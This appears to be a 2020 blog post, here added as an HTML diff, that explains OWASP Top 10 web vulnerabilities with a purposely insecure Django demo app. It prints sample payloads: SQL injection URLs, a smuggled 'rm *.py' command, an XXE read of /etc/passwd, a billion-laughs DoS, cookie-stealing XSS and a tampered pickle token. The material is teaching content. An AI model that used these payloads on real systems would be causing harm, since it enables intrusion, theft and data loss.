@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+  <head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-119994839-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-119994839-1');
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="description" content="Stay paranoid and trust no one. Common security issues in web applications explained with Python and Django. Examples of SQL injection and command injection. Cross-site scripting, and other common vulnerabilities.">
+    <meta name="keywords" content="web security, vulnerabilities, injection, sql injection, cross site scripting, django, python, javascript, tokens, pickle, user data, owasp, xss">
+    <meta name="author" content="Maciej Lechowski">
+    <title>Stay paranoid and trust no one. Overview of common security vulnerabilities in web applications</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="static/styles.css">
+    <link rel="alternate" type="application/rss+xml" href="posts.xml" />
+  </head>
+  <body>
+    <div class="article">
+    <div id="header"><a href="index.html">Home</a></div>
+    <h1>Stay paranoid and trust no one. Overview of common security vulnerabilities in web applications</h1>
+    Published 2020-02-06
+    <div id="text" style="max-width: 760px;">
+      <p>There&rsquo;s a lot of different security issues that affect web applications. However, there&rsquo;s a number of very common problems that occur all the time. They&rsquo;re quite well-known and the ways in which they can be mitigated are also well researched. This article summarises the most common issues according to Open Web Application Security Project (OWASP). Additionally, I&rsquo;ve created a small web application in Django that showcases how some of the common security issues could be exploited.</p>
+
+<p>This is based on some of the OWASP&rsquo;s resources such as [1] and [2]. The example Django application is available on <a href="https://github.com/lchsk/django-insecure">my github</a> [3].</p>
+
+<p>To run the application, get it from github and run</p>
+
+<pre><code>cd insecure
+python manage.py runserver
+</code></pre>
+
+<h2>Injection</h2>
+
+<p>In general, injection refers to any case of sending hostile data to an application. Any part of the application that asks for input (URLs, text fields, etc.) are potentially vulnerable. Oftentimes, attackers try to exploit underlying technology used by the application, such as SQL (as in SQL injection) or scripting languages such as bash. Most common reason why this type of attack is possible is due to lack of input validation or validation not being strict enough (e.g. not checking types or length of input).</p>
+
+<h3>SQL Injection</h3>
+
+<p>The most common type of injection is SQL injection. An application is potentially vulnerable if user input is not correctly handled before sending a query to the database. It can result in an attacker obtaining sensitive data about a large number of users or even modifying or deleting database records. Common remedies include:</p>
+
+<ul>
+<li>parameterised queries which are supported by common databases and their drivers,</li>
+<li>ORM libraries which should be able to internally prevent injection by e.g. parameterised queries,</li>
+<li>if possible, whitelists, to only accept user input from a known source.</li>
+</ul>
+
+<p>Consider the following code from the example Django application [3].</p>
+
+<p>Unsafe query where SQL injection is possible:</p>
+
+<pre><code>user = User.objects.raw(f'SELECT * FROM security_user WHERE id = {user_id}')
+</code></pre>
+
+<p>This doesn&rsquo;t use a parameterised query and instead uses whatever an application received from a user as <code>user_id</code>. This can be easily exploited as in the following example.</p>
+
+<p>An unsafe call to return a user with <code>user_id</code> = 1:</p>
+
+<pre><code>http://127.0.0.1:8000/security/unsafe/users/1
+</code></pre>
+
+<p>You can abuse that interface by adding <code>1 or id = 2</code> to the URL which will return two different users:</p>
+
+<pre><code>http://127.0.0.1:8000/security/unsafe/users/1%20or%20id%20=2
+</code></pre>
+
+<p>You can even easily request all users by providing a condition that&rsquo;s always true, e.g. <code>1 or 1</code></p>
+
+<pre><code>http://127.0.0.1:8000/security/unsafe/users/1%20or%201
+</code></pre>
+
+<p>In that way, users data can be exploited. If the same could be applied to <code>UPDATE</code> or <code>DELETE</code> queries, it would result in data loss and outage.</p>
+
+<p>In order to prevent SQL injection, one can use parameterised query which doesn&rsquo;t concatenate query and argument strings in Python.</p>
+
+<pre><code>user = User.objects.raw('SELECT * FROM security_user WHERE id = %s', (user_id,))
+</code></pre>
+
+<p>Or use ORM:</p>
+
+<pre><code>user = User.objects.get(id=user_id)
+</code></pre>
+
+<h3>Command Injection</h3>
+
+<p>It&rsquo;s similar to SQL injection but instead uses various system commands to inject malicious code. It can affect any component that uses a scripting language.</p>
+
+<p>It can allow reading any files within the directory tree if there are no constraints on what the argument could be or what directories could be accessed. For instance:</p>
+
+<pre><code>http://127.0.0.1:8000/security/files/read/manage.py
+</code></pre>
+
+<p>will print Django&rsquo;s <code>manage.py</code> using the following code.</p>
+
+<pre><code>def read_file(request, filename):
+    with open(filename) as f:
+        return HttpResponse(f.read())
+</code></pre>
+
+<p>It&rsquo;s unsafe and misses validation of what <code>filename</code> can be or which files can be opened.</p>
+
+<p>Even worse, it can lead to data loss.</p>
+
+<p>Consider this example that tries to copy a file using shell&rsquo;s <code>cp</code> command. It passes <code>filename</code> argument directly to be executed by shell using <code>os.system</code>.</p>
+
+<pre><code>def copy_file(request, filename):
+    cmd = f'cp {filename} new_{filename}'
+    os.system(cmd)
+    return HttpResponse(&quot;All good, don't worry about a thing :&gt;&quot;)
+</code></pre>
+
+<p>If something like <code>http://127.0.0.1:8000/security/files/copy/manage.py</code> is executed, then simply a copy of <code>manage.py</code> called <code>new_manage.py</code> will be created. However, due to the fact that anything can be passed as <code>filename</code>, an attacker could pass in additional commands such as:</p>
+
+<pre><code>http://127.0.0.1:8000/security/files/copy/manage.py;%20rm%20*.py
+</code></pre>
+
+<p>which can be interpreted as <code>manage.py; rm *.py</code>. When executed, this will remove Python files in the root directory.</p>
+
+<h2>Broken Authentication</h2>
+
+<p>Authentication and session management are not easy problems even in relatively small applications and therefore it&rsquo;s easy to implement them incorrectly. Attackers target applications that are not paying close attention to safe implementation and handling of security mechanisms such as passwords and tokens. If compromised, they can take over user&rsquo;s account and obtain sensitive information. If compromised user&rsquo;s account is privileged (admin account etc.) then it furthers the damage.</p>
+
+<p>Common problems include allowing brute-force attacks by not providing security mechanisms to block potential threats (such as temporarily banning users, blacklisting IP addresses etc.). Some applications come with weak default passwords and provide shared accounts for multiple users. Another very common problem touches on lack of/bad password policy. According to UK&rsquo;s National Cyber Security Centre [4], good password policy includes:</p>
+
+<ul>
+<li>reducing reliance on passwords (by for example, providing multi-factor authentication),</li>
+<li>using password generators,</li>
+<li>not enforcing complexity requirements,</li>
+<li>avoiding short passwords,</li>
+<li>not expiring password automatically.</li>
+</ul>
+
+<p>Some of it is counter-intuitive (e.g. complexity requirements which are ubiquitous but give a false sense of security without necessarily being more secure). Other suggestion, avoiding automatic password expiry, intends to encourage users to choose a hard password and stick to it, rather than changing from one weak password to another weak password regularly.</p>
+
+<p>Application&rsquo;s handling of passwords and tokens is critical. For example, passwords hashed using simple, outdated, or badly implemented algorithms can be cracked relatively quickly by GPUs. User tokens must be invalidated when they&rsquo;re no longer needed (i.e. after user logs out, or after a period of inactivity). Bad implementation of password recovery can also be a vulnerability (e.g. knowledge-based questions asked of a user can be dangerous and should be avoided).</p>
+
+<h2>Sensitive Data Exposure</h2>
+
+<p>Many applications store a lot of sensitive data about their users, potentially data related to finance or healthcare. Attackers getting access to that can cost companies loss of reputation, users&rsquo; trust, and penalties due to regulations such as GDPR in the EU. Obtaining user&rsquo;s data can also lead to other crimes, even outside vulnerable application, e.g. by using someone&rsquo;s personal data to commit credit card fraud.</p>
+
+<p>Ideally, applications store as little sensitive data about users as possible. If the data is required, it should be securely stored (encrypted). Handling sensitive data is tricky and can easily leak e.g. by caching user profiles or logging. For example, consider a user profile:</p>
+
+<pre><code>class User:
+	# ...
+	def __str__(self):
+		Return f’{self.name} {self.email} {self.phone}’
+</code></pre>
+
+<p>At some point, an application might want to log a user action:</p>
+
+<pre><code>logger.info(‘User %s created a record’, user)
+</code></pre>
+
+<p>which would cause user&rsquo;s name, email, and phone number to be recorded in logs (which could be stored insecurely for a long time). Instead, only something like an ID should be logged.</p>
+
+<p>Unsafe password storage mechanisms mentioned before and not enforcing HTTPS could also help attackers to see sensitive information.</p>
+
+<h2>XML External Entities</h2>
+
+<p>Common especially in older, poorly designed or misconfigured applications that use XML and accept XML as input. They can potentially be tricked into accepting dangerous content. The problem is related to the use of external entities definitions in XML (DTDs) which should be disabled in libraries parsing XML. Misconfiguration and use of buggy/outdated libraries can also contribute to the problem. Validation and whitelisting user input is also encouraged.</p>
+
+<p>Example which could allow an attacker to read system file storing sensitive data (<code>/etc/passwd</code>).</p>
+
+<pre><code> &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+  &lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+
+<p>A problem related to XML&rsquo;s entities can also cause a denial of service attack. It can also affect other formats that use references to other objects (like YAML). An attack called &ldquo;billion laughs attack&rdquo;, shown below, exploits XML&rsquo;s entities that expand <code>log9</code> into a large amount of data that could not fit into memory and crash the application. In an example below, <code>lol9</code> will expand into ten <code>lol8</code>s which in turn will expand into ten <code>lol7</code>s and so on.</p>
+
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE lolz [
+ &lt;!ENTITY lol &quot;lol&quot;&gt;
+ &lt;!ELEMENT lolz (#PCDATA)&gt;
+ &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+ &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;
+ &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+ &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
+ &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
+ &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
+ &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
+ &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
+ &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+</code></pre>
+
+<h2>Broken Access Control</h2>
+
+<p>Badly implemented access control can mean that enforcing what a user can see or modify doesn&rsquo;t work correctly. For instance, a logged in user could get access to or delete other user&rsquo;s data. Or elevate their privileges and get access to admin panel.</p>
+
+<p>Bad implementation can cause large amounts of data to be leaked. For instance, if integers are used as primary keys of certain resources (e.g. users), then they could be enumerated and data of many users could be stolen. Consider:</p>
+
+<pre><code>http://127.0.0.1:8000/security/safe/users/1
+</code></pre>
+
+<p>This loads data of user with <code>id = 1</code>, but replacing <code>1</code> with other integers could allow access to other users&rsquo; data.</p>
+
+<p>Lack of testing could result in mistakes in how authentication is implemented, for instance by providing authentication for <code>POST</code> requests but not <code>GET</code> requests.</p>
+
+<p>It is important to be considerate of resources that can be accessed publicly. By default, access to records should require authentication. Additionally, user permissions should be granular, i.e. they should describe what a user can do and to which records (e.g. create an object but not delete it).</p>
+
+<p>In order to limit potential damage, logging and monitoring should be aware of issues such as authentication failures. Rate limits in APIs can help prevent mass exposure of data.</p>
+
+<h2>Security Misconfiguration</h2>
+
+<p>Configuring complex software such as web servers and frameworks can be difficult and therefore prone to errors. In such cases, attackers can exploit either mistakes in configuration or bad default settings (including things such as default passwords). Lack of updates to libraries, frameworks and other components can also be a serious threat.</p>
+
+<p>Default settings can cause showing too detailed error messages to users that include sensitive information (such as filenames and lines of code). For instance, shipping a Django application with a setting <code>DEBUG=True</code> will result in printing stacktraces. Other settings can, for example, make a web server list all files in a directory.</p>
+
+<h2>Cross-Site Scripting (XSS)</h2>
+
+<p>Attackers can execute scripts in victim’s browser due to invalid treatment of user input. Whenever untrusted data (e.g. user input) is included in a web page, extra care must be taken. Successful XSS attack can result in sensitive data (e.g. credit card number) being stolen, or session being hijacked.</p>
+
+<p>Any data that&rsquo;s going to be a part of HTML, JSON, JavaScript, CSS, URLs etc. should be treated carefully and escaped (ideally using a well-tested library). In particular, characters that can be exploited must be taken care of, such as:</p>
+
+<pre><code>&amp; encoded as &amp;amp;
+&lt; encoded as &amp;lt;
+&gt; encoded as &amp;gt;
+&quot; encoded as &amp;quot;
+</code></pre>
+
+<p>Defining content security policy in headers allows to limit from where files can be loaded by a browser. For example, to load JavaScript files only from <code>example.com</code> the following policy could be used:</p>
+
+<pre><code>Content-Security-Policy: script-src example.com
+</code></pre>
+
+<p>Additionally, <code>HttpOnly</code> flag can be set on a cookie which tells a browser to prohibit access to cookies on the client side.</p>
+
+<p>In the example Django application, there&rsquo;s a following URL:</p>
+
+<pre><code>http://127.0.0.1:8000/security/search?query=
+</code></pre>
+
+<p>which is where a search query is entered. This could be dangerous.</p>
+
+<p>Code such as this</p>
+
+<pre><code>http://127.0.0.1:8000/security/search?query=&lt;script&gt;alert(%27hello%27)&lt;/script&gt;
+</code></pre>
+
+<p>will just show a &ldquo;hello&rdquo; message but executing the following request:</p>
+
+<pre><code>http://127.0.0.1:8000/security/search?query=%3Cscript%3Enew%20Image().src=%22http://127.0.0.1:8000/security/log?string=%22.concat(document.cookie)%3C/script%3E
+</code></pre>
+
+<p>will send user&rsquo;s cookies to a potentially different website. In this case it goes to the same Django application which prints out the cookie, thus compromising security.</p>
+
+<p>A more readable version:</p>
+
+<pre><code>&lt;script&gt;new Image().src=&quot;http://127.0.0.1:8000/security/log?string=&quot;.concat(document.cookie)&lt;/script&gt;
+</code></pre>
+
+<p>shows that this creates a new image and tries to load it from a URL beginning with <code>http://127.0.0.1:8000/security/</code> and ending with user&rsquo;s cookies. Appropriate Content-Security Policy would have blocked it.</p>
+
+<h2>Insecure Deserialization</h2>
+
+<p>Applications move a lot of data in a serialized format e.g. when passing messages between different services, or when parsing a security token. This can allow an attacker to inject dangerous code or take over user&rsquo;s data. This can occur whenever an application deserializes data (i.e. turns data in formats designed for storage or transfer into objects understood by a programming language). Attacks like that can affect many parts of the wider architecture, including databases, key-value stores, cookies, authentication, communication between services and others.</p>
+
+<p>To help mitigate the risks, if possible, data should only be accepted from known sources (i.e. not external users). Careful handling of data should include strict validation and using hashing to verify if serialized data has been manipulated. Additionally, monitoring failures (exceptions) occurring during deserialization can catch attackers who are trying to inject malicious content into serialized messages.</p>
+
+<p>As an example, consider a simple class representing a user:</p>
+
+<pre><code>@dataclass
+class TestUser:
+    perms: int = 0
+</code></pre>
+
+<p>Field <code>perms</code> can be understood as access level a user has, <code>0</code> for ordinary users and <code>1</code> for administrators.</p>
+
+<p>The request handler, presented below, decodes a token encoded using <code>base64</code> and then tries to &ldquo;unpickle&rdquo; it using Python&rsquo;s <code>pickle</code> module from the standard library. The intention is to transfer the data stored in a token into an instance of <code>TestUser</code> class. Then, <code>perms</code> field is checked and different output is shown depending on whether the application thinks it&rsquo;s dealing with an administrator or not.</p>
+
+<pre><code>def admin_index(request):
+    token = base64.b64decode(request.COOKIES.get('silly_token', ''))
+    user = pickle.loads(token)
+
+    if user.perms == 1:
+        return HttpResponse('Hello Admin')
+
+    return HttpResponse('No access')
+</code></pre>
+
+<p>This is unsafe and can be abused.</p>
+
+<p>Pickled test user looks like this:</p>
+
+<pre><code>b'\x80\x03csecurity.views\nTestUser\nq\x00)\x81q\x01}q\x02X\x05\x00\x00\x00permsq\x03K\x00sb.'
+</code></pre>
+
+<p>An attacker could notice the last part, <code>permsq\x03K\x00sb.</code>, includes the string <code>perms</code>. If it&rsquo;s changed to <code>permsq\x03K\x01sb</code> (just a change from <code>0</code> to <code>1</code> which is the value of <code>perms</code>), an encoded token could be inserted into a cookie. After visiting <a href="http://127.0.0.1:8000/security/admin/">http://127.0.0.1:8000/security/admin/</a> an attacker would see &ldquo;Hello Admin&rdquo; and that way gain access to the closed-off part of the application.</p>
+
+<p>This shows that one have to be careful when deserializing data obtained from external sources.</p>
+
+<h2>Using Components with Known Vulnerabilities</h2>
+
+<p>Typical application has many dependencies such as libraries, frameworks, servers etc. Each of them can have their own vulnerabilities that when detected need to be updated. It&rsquo;s important to have a process for tracking and updating dependencies regularly. This can be difficult and time-consuming if an application has many different dependencies, especially if they&rsquo;re relatively obscure or no longer maintained.</p>
+
+<h2>Insufficient Logging &amp; Monitoring</h2>
+
+<p>Sufficient logging, monitoring, and alerting can detect an attack at an earlier stage, thus minimising the damage. Left unchecked, attackers can spend more time preparing their attack and expose other parts of the application, causing even a wider breach. Often, it&rsquo;s not the victim that detects an attack, but rather a third-party. It also typically happens much later; in 2016 it took an average of 191 days to detect a security problem [1]. In short, the sooner an attack can be detected, the less damage it&rsquo;s likely to cause.</p>
+
+<p>That&rsquo;s why it&rsquo;s advised to not only monitor application errors (such as programming language exceptions) but also suspicious activity. Events such as failed logins, password changes can be logged and alerts may be raised if reasonable thresholds are breached. Whether sufficient amount of logs and alerts is set up can be tested via penetration testing. Certain critical actions, such as sign ins and password changes, can be logged as part of an audit log to ease investigations of suspicious activity. Having a process for responding to and escalating potential security issues is necessary to avoid missing alerts raised by automated systems.</p>
+
+<p>Automated monitoring can warn about issues such as malicious script trying to log in to a user&rsquo;s account using a database of common passwords.</p>
+
+<h2>How to detect and prevent vulnerabilities?</h2>
+
+<ul>
+<li>Education and review</li>
+</ul>
+
+<p>Being aware of attacks that could happen makes it easier to spot them in code reviews.</p>
+
+<ul>
+<li>Testing and monitoring</li>
+</ul>
+
+<p>Alerts based on events such as failed login attempts can help prevent attacks.</p>
+
+<ul>
+<li>Automation</li>
+</ul>
+
+<p>There are automated tools that can help find potential security concerns.</p>
+
+<h2>Automation</h2>
+
+<p>In case of Python, there&rsquo;s <code>bandit</code> [5] project which can automatically find many potential threats and report them.</p>
+
+<p>To run it on the example Django application, execute:</p>
+
+<pre><code>bandit -r ./insecure/security
+</code></pre>
+
+<p>This will print a number of messages, along with corresponding code. Some of them will be related to concerns mentioned before.</p>
+
+<p>For instance, it warns of a &ldquo;possible SQL injection&rdquo; where it indeed can occur.</p>
+
+<pre><code>&gt;&gt; Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
+   Severity: Medium   Confidence: Low
+   Location: insecure/security/views.py:13
+   More Info: https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html
+12	def unsafe_users(request, user_id):
+13	    users = User.objects.raw(f'SELECT * FROM security_user WHERE id = {user_id}')
+</code></pre>
+
+<p>It also does warn about use of <code>pickle</code> module and how unsafe it can be.</p>
+
+<pre><code>&gt;&gt; Issue: [B301:blacklist] Pickle and modules that wrap it can be unsafe when used to deserialize untrusted data, possible security issue.
+   Severity: Medium   Confidence: High
+   Location: insecure/security/views.py:51
+   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b301-pickle
+50	
+51	    user = pickle.loads(token)
+</code></pre>
+
+<h2>Summary</h2>
+
+<p>This article presented a number of common security concerns that can occur in web applications. Due to how widespread and serious can they be, it&rsquo;s necessary to be aware of risks and how to mitigate them.</p>
+
+<p>[1] <a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf">https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf</a></p>
+
+<p>[2] <a href="https://cheatsheetseries.owasp.org">https://cheatsheetseries.owasp.org</a></p>
+
+<p>[3] <a href="https://github.com/lchsk/django-insecure">https://github.com/lchsk/django-insecure</a></p>
+
+<p>[4] <a href="https://www.ncsc.gov.uk/files/password_policy_infographic.pdf">https://www.ncsc.gov.uk/files/password_policy_infographic.pdf</a></p>
+
+<p>[5] <a href="https://github.com/PyCQA/bandit">https://github.com/PyCQA/bandit</a></p>
+
+    </div>
+  </div>
+  </body>
+</html>
